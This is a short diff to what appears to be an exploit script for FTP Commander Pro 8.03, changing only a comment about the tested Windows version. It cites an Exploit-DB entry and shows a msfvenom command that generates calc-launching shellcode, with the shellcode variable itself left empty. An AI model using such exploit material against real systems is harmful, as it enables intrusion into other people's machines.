@@ -2,7 +2,7 @@
 
 # FTP Commander Pro 8.03
 # Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/47775
-# Exploit tested on Windows XP Pro SP3 FR / Windows 10 Pro EN
+# Exploit tested on Windows XP Pro SP3 FR / Windows 10.0.18363.778 Pro EN
 
 # msfvenom -p windows/exec CMD=calc -e x86/alpha_mixed -f python -v shellcode
 shellcode =  b""
